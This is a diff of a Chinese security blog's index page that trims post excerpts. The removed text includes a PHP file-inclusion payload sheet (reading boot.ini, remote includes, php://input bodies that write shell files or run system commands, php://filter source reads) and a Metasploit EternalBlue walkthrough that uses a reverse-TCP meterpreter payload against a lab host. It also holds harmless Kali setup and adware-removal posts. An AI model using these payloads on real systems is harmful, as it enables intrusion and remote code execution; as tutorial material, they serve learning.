@@ -348,50 +348,14 @@
 
       
         
-          
-            <h1 id="主要包含形式"><a href="#主要包含形式" class="headerlink" title="主要包含形式"></a>主要包含形式</h1><h2 id="1-包含本地文件"><a href="#1-包含本地文件" class="headerlink" title="1.包含本地文件"></a>1.包含本地文件</h2><p>payload：</p>
-<pre><code>?page=C:\oneword
-
-?file=C:\boot.ini（Windows查看系统版本）
-
-?file=C:\WindowsSystem32inetsrvMetaBase.xml（Windows查看IIS配置文件)
-</code></pre><h2 id="2-包含远程文件"><a href="#2-包含远程文件" class="headerlink" title="2.包含远程文件"></a>2.包含远程文件</h2><p>payload：</p>
-<pre><code>?url=http://www.bbb.com/2.txt
-
-?url=[http|https|ftp]://www.bbb.com/2.txt（可以有三种，http、https、ftp）
-</code></pre><h2 id="3-伪协议"><a href="#3-伪协议" class="headerlink" title="3.伪协议"></a>3.伪协议</h2><p>1) php://input</p>
-<p>说明：</p>
-<p>用来接收POST数据。我们能够通过input把我们的语句输入上去然后执行。</p>
-<p>条件：</p>
-<p>php &lt;5.0 ，allow_url_include=Off 情况下也可以用</p>
-<p>php &gt; 5.0，只有在allow_url_fopen=On 时才能使用</p>
-<p>用例1 增加一句话：</p>
-<p>URL：</p>
-<pre><code>http://localhost/include/file.php?file=php://input
-</code></pre><p>POST：</p>
-<pre><code>&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;a&quot;),&quot;&lt;?php phpinfo();?&gt;&quot;) ?&gt;
-</code></pre><p>用例2 增加文件：</p>
-<p>URL：<br><code>http://localhost/include/file.php?file=php://input</code><br>POST：<br><code>&lt;?php fputs(fopen(&quot;oneword.php&quot;,&quot;w&quot;),&quot;&lt;?php phpinfo();?&gt;&quot;) ?&gt;</code><br>这里fopen参数为w，可新建一个文件。</p>
-<p>用例3 执行系统命令：</p>
-<p>URL：<br><code>http://localhost/include/file.php?file=php://input</code><br>POST：<br><code>&lt;?php system(&#39;ipconfig&#39;);?&gt;</code></p>
-<hr>
-<p>2)data://</p>
-<p>说明：</p>
-<p>这是一种数据流封装器，data:URI schema(URL schema可以是很多形式)</p>
-<p>利用data://伪协议进行代码执行的思路原理和php://是类似的，都是利用了PHP中的流的概念，将原本的include的文件流重定向到了用户可控制的输入流中</p>
-<p>条件：</p>
-<p>allow_url_include=On<br>php &gt; 5.2</p>
-<hr>
-<p>3)<strong>php://filter</strong></p>
-<p>说明：</p>
-<p>这个语句用来查看源码。直接包含php文件时会被解析，不能看到源码，所以用filter来读取，不过要先base64加密传输过来：</p>
-<pre><code>?page=php://filter/read=convert.base64-encode/resource=php.ini
-</code></pre><p>访问上述URL后会返回config.php中经过Base64加密后的字符串，解密即可得到源码</p>
-<p><strong>payload:</strong></p>
-<pre><code>http://localhost/file.php?file=php://filter/read=convert.base64-encode/resource=file.php
-</code></pre><p>资料来源：<br><a href="https://www.anquanke.com/post/id/86123" title="参考网站" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86123</a></p>
-
-          
+          <h1 id="主要包含形式"><a href="#主要包含形式" class="headerlink" title="主要包含形式"></a>主要包含形式</h1><h2 id="1-包含本地文件"><a href="#1-包含本地文件" class="headerlink" title="1.包含本地文件"></a>1.包含本地文件</h2><p>payload：</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/04/09/文件包含漏洞常用命令/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -530,32 +494,20 @@
 
       
         
-          
-            <h1 id="一加1（bacon）-Kali-Nethunter安装指南"><a href="#一加1（bacon）-Kali-Nethunter安装指南" class="headerlink" title="一加1（bacon） Kali Nethunter安装指南"></a>一加1（bacon） Kali Nethunter安装指南</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ol>
+          <h1 id="一加1（bacon）-Kali-Nethunter安装指南"><a href="#一加1（bacon）-Kali-Nethunter安装指南" class="headerlink" title="一加1（bacon） Kali Nethunter安装指南"></a>一加1（bacon） Kali Nethunter安装指南</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ol>
 <li><h3 id="准备一加一手机"><a href="#准备一加一手机" class="headerlink" title="准备一加一手机"></a>准备一加一手机</h3><ul>
 <li>解锁并刷到CM12并且开过一次机（我用魔趣也能成功，理论上来说任意6.0都行）</li>
-<li>刷好TWRP recovery</li>
-</ul>
-</li>
-<li><h3 id="官网下载刷机包"><a href="#官网下载刷机包" class="headerlink" title="官网下载刷机包"></a>官网下载刷机包</h3><hr>
-<h4 id="夜版（nightly）"><a href="#夜版（nightly）" class="headerlink" title="夜版（nightly）"></a>夜版（nightly）</h4><p> 刷机包本体：<br> <a href="https://build.nethunter.com/nightly/2017.11-18-1618/nethunter-generic-armhf-kalifs-full-rolling-2017.11-18-1618.zip" title="ARM框架用" target="_blank" rel="noopener">https://build.nethunter.com/nightly/2017.11-18-1618/nethunter-generic-armhf-kalifs-full-rolling-2017.11-18-1618.zip</a></p>
-<p> 内核：<br> 6.0 <a href="https://build.nethunter.com/nightly/2017.11-18-1618/kernel-nethunter-oneplus1-marshmallow-2017.11-18-1618.zip" title="安卓6.0" target="_blank" rel="noopener">https://build.nethunter.com/nightly/2017.11-18-1618/kernel-nethunter-oneplus1-marshmallow-2017.11-18-1618.zip</a></p>
-<hr>
-<h4 id="正式版（强烈推荐）"><a href="#正式版（强烈推荐）" class="headerlink" title="正式版（强烈推荐）"></a>正式版（强烈推荐）</h4><p> 刷机包本体：<br> <a href="https://build.nethunter.com/release/marshmallow/nethunter-oneplus1-marshmallow-kalifs-full-3.20-20170717-1810.zip" title="适用于一加1的正式版" target="_blank" rel="noopener">https://build.nethunter.com/release/marshmallow/nethunter-oneplus1-marshmallow-kalifs-full-3.20-20170717-1810.zip</a></p>
-<hr>
-</li>
-<li><h3 id="刷机"><a href="#刷机" class="headerlink" title="刷机"></a>刷机</h3><ul>
-<li>千万别双清，千万别双清，千万别双清（如果date被清了会刷写失败）</li>
-<li>卡刷刷机包本体（正式版）</li>
-<li>（如果是夜版先刷内核再刷刷机包本体）</li>
-</ul>
-</li>
-</ol>
-
-          
+<li><p>刷好TWRP recovery</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/03/10/打造手机渗透神器kali-linux-nethunter安装/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
-    </div>
+    </li></ul></li></ol></div>
     
     
     
@@ -669,11 +621,14 @@
 
       
         
-          
-            <h1 id="怒草流氓软件"><a href="#怒草流氓软件" class="headerlink" title="怒草流氓软件"></a>怒草流氓软件</h1><p>在某网站上下载软件，不小心用了高速下载，然后就被安装了流氓软件。<br>天天开机弹广告，还不是启动项，通过进程删掉流氓软件后每次开机出现explorer.exe警告，在网上搜索后找到解决方案。 </p>
-<p>在注册表<strong>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</strong>里能找到和流氓软件对应地址的一个注册表项，删除此项，重启，问题解决。</p>
-
-          
+          <h1 id="怒草流氓软件"><a href="#怒草流氓软件" class="headerlink" title="怒草流氓软件"></a>怒草流氓软件</h1><p>在某网站上下载软件，不小心用了高速下载，然后就被安装了流氓软件。<br>天天开机弹广告，还不是启动项，通过进程删掉流氓软件后每次开机出现explorer.exe警告，在网上搜索后找到解决方案。 </p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/02/11/记一次解决某网站高速下载病毒/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -812,23 +767,14 @@
 
       
         
-          
-            <h3 id="更换apt源后显示GPG错误-签名无效等"><a href="#更换apt源后显示GPG错误-签名无效等" class="headerlink" title="更换apt源后显示GPG错误 签名无效等"></a>更换apt源后显示GPG错误 签名无效等</h3><h5 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h5><p>Kali Linux由于太长时间未更新，而出现GPG错误 KEYEXPIRED 1425567400。经检查源未出现问题可以解析，deb也不冲突，就是密钥过期了!<img src="https://s1.ax2x.com/2018/02/06/vQvfJ.png" alt=""></p>
-<h5 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h5><p>具体更新方法有以下几种方法：（任选一种即可）</p>
-<pre><code>1、# apt-key adv --keyserver keys.gnupg.net --recv-keys ED444FF07D8D0BF6
-</code></pre><hr>
-<pre><code>2、# wget -q -O - archive.kali.org/archive-key.asc | apt-key add
-</code></pre><hr>
-<pre><code>3、# gpg --keyserver hkp://pgpkeys.mit.edu --recv-key ED444FF07D8D0BF6
-# gpg -a --export ED444FF07D8D0BF6 | sudo apt-key add -
-</code></pre><hr>
-<pre><code>4、# wget https://http.kali.org/kali/pool/ ... ring_2018.1_all.deb
-# apt install ./kali-archive-keyring_2018.1_all.deb
-</code></pre><p>成功更新密钥之后，我们就可以正常的 update / upgrade 了。</p>
-<p>然后在执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure></p>
-<p>即可。<br><img src="https://s1.ax2x.com/2018/02/06/vQhal.png" alt="解决"></p>
-
-          
+          <h3 id="更换apt源后显示GPG错误-签名无效等"><a href="#更换apt源后显示GPG错误-签名无效等" class="headerlink" title="更换apt源后显示GPG错误 签名无效等"></a>更换apt源后显示GPG错误 签名无效等</h3><h5 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h5><p>Kali Linux由于太长时间未更新，而出现GPG错误 KEYEXPIRED 1425567400。经检查源未出现问题可以解析，deb也不冲突，就是密钥过期了!<img src="https://s1.ax2x.com/2018/02/06/vQvfJ.png" alt=""></p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/02/06/kali更新源问题解决方案/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -945,26 +891,14 @@
 
       
         
-          
-            <h1 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h1><h2 id="前提条件："><a href="#前提条件：" class="headerlink" title="前提条件："></a>前提条件：</h2><p><strong>gem install ruby_smb</strong><br>—-ruby_smb模块安装<br><strong>msfupdate</strong><br>—-msf的更新<br><strong>msfconsole -qx “use<br>exploit/windows/smb/ms17_010_eternalblue”</strong><br>—-启动并加载模块</p>
-<hr>
-<h2 id="部署环境："><a href="#部署环境：" class="headerlink" title="部署环境："></a>部署环境：</h2><ul>
-<li><strong>msfconsole</strong>  </li>
-<li><strong>wget <a href="https://raw.githubusercontent.com/backlion/metasploit-framework/master/modules/exploits/windows/smb/ms17_010_eternalblue.rb" target="_blank" rel="noopener">https://raw.githubusercontent.com/backlion/metasploit-framework/master/modules/exploits/windows/smb/ms17_010_eternalblue.rb</a></strong>  </li>
-<li><strong>cp ms17_010_eternalblue.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_eternalblue.rb</strong>  </li>
-</ul>
-<hr>
-<h2 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击:"></a>开始攻击:</h2><ul>
-<li><strong>msfconsole</strong></li>
-<li><strong>use exploit/windows/smb/ms17_010_eternalblue</strong> </li>
-<li><strong>set rhost 192.168.21.128</strong></li>
-<li><strong>set lhost 192.168.21.131</strong></li>
-<li><strong>set payload windows/x64/meterpreter/reverse_tcp</strong></li>
-<li><strong>exploit</strong>  </li>
-<li><strong>shell</strong></li>
-</ul>
-
-          
+          <h1 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h1><h2 id="前提条件："><a href="#前提条件：" class="headerlink" title="前提条件："></a>前提条件：</h2><p><strong>gem install ruby_smb</strong><br>—-ruby_smb模块安装<br><strong>msfupdate</strong><br>—-msf的更新<br><strong>msfconsole -qx “use<br>exploit/windows/smb/ms17_010_eternalblue”</strong><br>—-启动并加载模块</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/01/18/瞎搞的一次ms17-0100漏洞利用/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
